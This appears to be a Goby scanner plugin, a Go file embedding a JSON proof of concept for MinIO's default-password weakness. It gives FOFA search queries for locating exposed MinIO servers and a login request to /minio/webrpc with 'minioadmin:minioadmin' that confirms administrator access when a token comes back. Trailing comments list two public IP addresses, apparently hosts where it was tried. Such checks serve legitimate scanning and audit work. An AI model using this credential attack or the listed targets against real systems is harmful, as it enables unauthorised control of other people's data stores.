package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "MinIO default password vulnerability",
    "Description": "<p>Minio is an object storage service based on the Apache License v2.0 open source agreement.</p><p>MinIO has a default password vulnerability. Attackers can control the entire platform through the default password vulnerability and use administrator privileges to operate core functions.</p>",
    "Product": "MinIO",
    "Homepage": "http://www.minio.org.cn/",
    "DisclosureDate": "2021-10-27",
    "Author": "",
    "FofaQuery": "title=\"MinIO\" || (body=\"href=\\\"/minio/loader.css\\\"\") || (server=\"Minio\")",
    "GobyQuery": "title=\"MinIO\" || (body=\"href=\\\"/minio/loader.css\\\"\") || (server=\"Minio\")",
    "Level": "1",
    "Impact": "<p>MinIO has a default password vulnerability. Attackers can control the entire platform through the default password vulnerability and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default command. The password should preferably contain small letters, numbers and special characters, etc., and the number of digits should be more than 8 digits. </p><p>2. If unnecessary, prohibit public access to the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
    "References": [
        "https://fofa.so/"
    ],
    "Translation": {
        "EN": {
            "Name": "MinIO default password vulnerability",
            "Product": "MinIO",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ],
            "Description": "<p>Minio is an object storage service based on the Apache License v2.0 open source agreement.<br></p><p>MinIO has a default password vulnerability. Attackers can control the entire platform through the default password vulnerability and use administrator privileges to operate core functions.<br></p>",
            "Impact": "<p>MinIO has a default password vulnerability. Attackers can control the entire platform through the default password vulnerability and use administrator privileges to operate core functions.<br></p>",
            "Recommendation": "<p>1. Modify the default command. The password should preferably contain small letters, numbers and special characters, etc., and the number of digits should be more than 8 digits. <br></p><p>2. If unnecessary, prohibit public access to the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>"
        }
    },
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/minio/webrpc",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"username\":\"minioadmin\",\"password\":\"minioadmin\"},\"method\":\"Web.Login\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uiVersion",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "token",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|minioadmin:minioadmin",
                "vulurl|lastbody|variable|{{{scheme}}}://minioadmin:minioadmin@{{{hostinfo}}}/minio/webrpc"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|minioadmin:minioadmin",
                "vulurl|lastbody|variable|{{{scheme}}}://minioadmin:minioadmin@{{{hostinfo}}}/minio/webrpc"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10831"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

//http://135.181.241.31
//https://47.104.235.150
//rate:2%
//产品等级：三级